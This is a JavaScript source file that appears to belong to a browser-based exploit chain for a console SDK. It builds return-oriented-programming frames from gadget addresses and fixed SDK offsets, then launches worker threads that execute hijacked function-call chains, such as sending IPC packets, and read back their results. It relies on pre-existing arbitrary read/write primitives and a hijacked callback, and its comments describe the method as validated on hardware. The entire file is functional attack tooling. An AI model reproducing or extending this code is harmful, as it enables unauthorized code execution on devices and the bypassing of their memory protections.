// ===================================================================
// ROP — call_rop() comes from the already-initialized CivSwitch core
// ===================================================================
//
// call_rop() is reusable: several calls can be chained in one payload and
// still terminate cleanly. Earlier ShadowStack crashes came from a wrong
// target: sdk_base + 0xcca8 instead of the GetInfo entry at sdk_base + 0x168ca4.
//
// call_rop() is provided by the initialized CivSwitch core and is not
// redefined here. Payloads are evaluated after that setup, so the
// window.v8Version() callback already points at fake_chi/fake_fgn.

// -- Worker thread frame builder ----------------------------------
//
// Builds a pre-programmed call chain that a new thread can execute.
// Pattern proven by the reference implementation (wk_twosend.js) on the same
// SDK and validated on hardware.
// Think of the frame as a coroutine: each step calls one function with four
// arguments and stores its return value in a shared results array.
// Layout: context header at +0x000, results at +0x800, function tables at
// +0x1000, then the call stack after a 0x10000-byte gap (0x140 bytes per call).
//
// Usage:
//   var f = buildFrame([
//       { fn: F_Tick, args: [0n] },
//       { fn: IPC_SEND_DISPATCHER, args: [BigInt(h), pkt, 0x1000n, 0n] },
//   ]);
//   var slot = allocPage(0x100);
//   write64(slot, 0n);
//   call_rop(F_CreateThread, slot, 0n, GADGET_LONGJMP, f.frame);
//   call_rop(F_Sleep, 60000000n);
//   var result = readFrameResult(f.frame, 1);  // IPC return value

const FRAME_STEP = 0x140;
const FRAME_RESULT = 0x800;
const FRAME_SENTINEL = 0xfedcba9876543210n;

function _frameAlignPage(n) {
    return Math.ceil(n / 0x1000) * 0x1000;
}

function _frameGetArg(call, k) {
    var a = call.args[k];
    return (a === undefined || a === null) ? 0n : BigInt(a);
}

// Build a ROP frame for a list of calls.
// Each call: { fn: BigInt, args: [x0, x1, x2, x3] }
// Returns: { frame: BigInt (address), size: number, count: number }
function buildFrame(calls) {
    var count = calls.length;
    var tables = 0x1000;
    var stack = _frameAlignPage(tables + count * 0x100) + 0x10000;
    var size = _frameAlignPage(stack + count * FRAME_STEP + 0x4000);
    var frame = allocPage(size);

    call_rop(GADGET_MEMSET, frame, 0n, BigInt(size));

    var put = function(off, v) {
        write64(frame + BigInt(off), BigInt(v));
    };

    put(0x10, frame + BigInt(tables));
    put(0x30, _frameGetArg(calls[0], 0));
    put(0x58, GADGET_LOAD_TABLE);
    put(0x68, frame + BigInt(stack));

    for (var i = 0; i < count; i++) {
        var table = tables + i * 0x100;
        var sp = stack + i * FRAME_STEP;

        put(table, frame + BigInt(table) + 0x10n);
        put(table + 0x80, calls[i].fn);
        put(FRAME_RESULT + i * 8, FRAME_SENTINEL);

        put(sp + 8, GADGET_CALL4);
        put(sp + 0x10, _frameGetArg(calls[i], 1));
        put(sp + 0x20, _frameGetArg(calls[i], 2));
        put(sp + 0x28, _frameGetArg(calls[i], 3));
        put(sp + 0xd8, GADGET_SAVE_RESULT);
        put(sp + 0x118, frame + BigInt(FRAME_RESULT + i * 8));

        if (i + 1 < count) {
            put(sp + 0x108, frame + BigInt(tables + (i + 1) * 0x100));
            put(sp + 0xe8, _frameGetArg(calls[i + 1], 0));
            put(sp + 0x128, GADGET_LOAD_TABLE);
        } else {
            put(sp + 0x128, F_ExitThread);
        }
    }

    return { frame: frame, size: size, count: count };
}

// Read the result of step i from a frame (BigInt, or SENTINEL if not done)
function readFrameResult(frame, i) {
    return read64(frame + BigInt(FRAME_RESULT + i * 8));
}

// Poll until step i completes (result != SENTINEL) or maxSpins reached
function waitFrameResult(frame, index, maxSpins) {
    maxSpins = maxSpins || 500000;
    var addr = frame + BigInt(FRAME_RESULT + index * 8);
    var v = read64(addr);
    var n = 0;
    while (v === FRAME_SENTINEL && n < maxSpins) {
        v = read64(addr);
        n++;
    }
    return { value: v, done: v !== FRAME_SENTINEL, spins: n };
}

// Launch a worker thread running a pre-built frame.
// Returns: { slot: BigInt, result: BigInt }
// slot is the ThreadType struct (SDK-managed, do not closeHandle).
function launchWorker(frame) {
    var slot = allocPage(0x100);
    write64(slot, 0n);
    var r = call_rop(F_CreateThread, slot, 0n, GADGET_LONGJMP, frame);
    return { slot: slot, result: r };
}
